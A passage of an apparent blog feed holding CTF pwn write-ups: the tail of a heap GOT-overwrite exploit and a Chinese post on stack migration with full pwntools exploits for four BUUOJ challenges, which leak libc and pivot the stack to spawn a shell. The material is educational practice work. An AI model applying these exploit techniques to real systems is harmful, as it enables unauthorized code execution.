class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26591</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x70</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,addr)</span><br><span class="line">libc_base = addr - libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;BUU-Heap&quot;&gt;&lt;a href=&quot;#BUU-Heap&quot; class=&quot;headerlink&quot; title=&quot;BUU_Heap&quot;&gt;&lt;/a&gt;BUU_Heap&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="Heap" scheme="https://trick.ink/tags/Heap/"/>
    
  </entry>
  
  <entry>
    <title>栈迁移</title>
    <link href="https://trick.ink/article/Stack%20migration/"/>
    <id>https://trick.ink/article/Stack%20migration/</id>
    <published>2021-09-28T19:24:35.968Z</published>
    <updated>2021-07-24T06:38:37.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><span id="more"></span><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="_ciscn_2019_es_2"></a>_ciscn_2019_es_2</h1><p>第一步：是把一个与ebp有关的地址泄漏出来，可以通过栈的填充做到</p><p>第二步：找到一个ebp与泄漏地址的偏移距离</p><p>第三步：构造fake_stack</p><p>fake_stack：</p><p><img src="/article/Stack%20migration/1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f.png" alt="1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f"></p><p>偏移距离：</p><p>break在printf处</p><p><img src="/article/Stack%20migration/20201208200613.png" alt="20201208200613"></p><p>距离为0x10</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25520</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&#x27;aaaa&#x27;</span> + p32(sys_addr) + <span class="string">&#x27;bbbb&#x27;</span> + p32(ebp-<span class="number">0x28</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1 += p32(ebp-<span class="number">0x28</span>-<span class="number">0x10</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="buu-spwn"><a href="#buu-spwn" class="headerlink" title="buu_spwn"></a>buu_spwn</h1><p>32bit程序</p><p>看ida</p><p><img src="/article/Stack%20migration/20201206182837.png" alt="20201206182837"></p><p>汇编中发现 leave retn</p><p><img src="/article/Stack%20migration/20201206183042.png" alt="20201206183042"></p><p>leave retn：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave &#x3D;&#x3D;&gt; mov esp, ebp;  pop ebp;</span><br><span class="line">retn  &#x3D;&#x3D;&gt; pop eip</span><br></pre></td></tr></table></figure><p>其中pop eip相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次leave ret即可控制esp为我们想要的地址。由于有pop ebp，会使esp-4（64位-8），将ebp 覆盖为想要调整的位置-4（64位-8）即可</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26070</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./spwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line"></span><br><span class="line">payload=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload=p32(sys_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(bin_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h1><p>IDA</p><p><img src="/article/Stack%20migration/image-20210531154533324.png" alt="image-20210531154533324"></p><p>仅溢出0x10字节，无法构造ROP。</p><p>程序还给了bss段，可读写</p><p><img src="/article/Stack%20migration/image-20210531154745045.png" alt="image-20210531154745045"></p><h2 id="构造-fake-stack"><a href="#构造-fake-stack" class="headerlink" title="构造 fake stack"></a>构造 fake stack</h2><p><img src="/article/Stack%20migration/image-20210531160601177.png" alt="image-20210531160601177"></p><p>程序中bss段与它上方的got表字段比较近，当rop段返回到main函数的时候会 sub  rsp, 60h ，有可能会覆盖掉 got 表导致程序报错，所以需要填充字段</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29811</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946 12345</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x00400703</span></span><br><span class="line">bank_addr = <span class="number">0x00601080</span></span><br><span class="line">leave_retn = <span class="number">0x0400699</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p64(bank_addr) + p64(leave_retn)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;me what you want\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)*<span class="number">20</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;now!&#x27;</span>,payload2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr ---&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x68</span>) + p64(onegadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;me what you want\n&#x27;</span>,payload3)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;now!&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-s-4"><a href="#ciscn-s-4" class="headerlink" title="ciscn_s_4"></a>ciscn_s_4</h1><p>IDA</p><p><img src="/article/Stack%20migration/image-20210720150810391.png" alt="image-20210720150810391"></p><p><img src="/article/Stack%20migration/image-20210720150946310.png" alt="image-20210720150946310"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29437</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_4&#x27;</span>)</span><br><span class="line">leave = <span class="number">0x80485FD</span></span><br><span class="line">system_plt = <span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">buf = ebp - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">payload = p32(system_plt) + p32(<span class="number">0</span>) + p32(buf+<span class="number">12</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buf-<span class="number">4</span>) + p32(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;栈迁移&quot;&gt;&lt;a href=&quot;#栈迁移&quot; class=&quot;headerlink&quot; title=&quot;栈迁移&quot;&gt;&lt;/a&gt;栈迁移&lt;/h1&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://trick.ink/categories/WriteUp/"/>
    
    
    <category term="栈迁移" scheme="https://trick.ink/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
</feed>
